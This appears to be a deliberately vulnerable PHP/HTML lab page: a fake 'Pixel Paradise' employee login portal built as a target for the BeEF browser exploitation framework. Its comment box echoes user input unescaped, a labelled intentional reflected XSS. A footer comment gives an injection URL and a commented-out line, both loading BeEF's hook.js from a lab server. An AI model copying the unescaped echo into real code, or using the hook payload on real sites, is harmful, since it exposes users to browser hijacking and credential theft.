<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pixel Paradise - Portal de Empleados</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f0f2f5;
            margin: 0;
            padding: 0;
        }

        .navbar {
            background: #2c3e50;
            color: white;
            padding: 1rem;
            text-align: center;
            font-weight: bold;
        }

        .container {
            max-width: 600px;
            margin: 50px auto;
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        h1 {
            color: #333;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 5px;
            color: #666;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }

        .btn {
            background: #3498db;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
        }

        .btn:hover {
            background: #2980b9;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
            color: #999;
            font-size: 12px;
        }

        .comment-section {
            margin-top: 30px;
            border-top: 1px solid #eee;
            padding-top: 20px;
        }

        .news {
            background: #e8f4fd;
            padding: 15px;
            border-radius: 4px;
            margin-top: 20px;
            border-left: 4px solid #3498db;
        }
    </style>
</head>

<body>

    <div class="navbar">Pixel Paradise Corporate Portal</div>

    <div class="container">
        <h1>Inicio de Sesión</h1>
        <form action="#" method="POST">
            <div class="form-group">
                <label>Nombre de Usuario</label>
                <input type="text" name="username" placeholder="tu_usuario@pixelparadise.com">
            </div>
            <div class="form-group">
                <label>Contraseña</label>
                <input type="password" name="password" placeholder="••••••••">
            </div>
            <button type="submit" class="btn">Entrar</button>
        </form>

        <div class="news">
            <strong>📢 Aviso:</strong> El portal se actualizará al nuevo sistema de autenticación el próximo mes.
            Por favor, actualice su navegador a la última versión.
        </div>

        <!-- Zona de Comentarios (Vulnerable a XSS para BeEF) -->
        <div class="comment-section">
            <h3>Buzón de Sugerencias (Público)</h3>
            <p>¿Tienes alguna idea para mejorar el paraíso? Déjala aquí:</p>
            <form method="GET">
                <input type="text" name="msg" placeholder="Tu mensaje..." style="width: 70%; padding: 5px;">
                <button type="submit">Publicar</button>
            </form>

            <?php
            if (isset($_GET['msg'])) {
                // VULNERABILIDAD INTENCIONAL: XSS Reflejado
                // Aquí es donde BeEF puede inyectar su hook.js
                echo "<p style='color:green;'>Tu mensaje ha sido recibido: " . $_GET['msg'] . "</p>";
            }
            ?>
        </div>
    </div>

    <div class="footer">
        &copy; 2026 Pixel Paradise Inc. | Acceso Restringido.
        <!--
    ========================================================
    INSTRUCCIÓN PARA EL LAB:
    Para enganchar este sitio a BeEF, usa la URL:
    http://localhost:8083/?msg=<script src="http://172.32.0.10:3000/hook.js"></script>
    O edita este archivo y descomenta la línea de abajo:
    ========================================================
    -->
        <!-- <script src="http://172.32.0.10:3000/hook.js"></script> -->
    </div>

</body>

</html>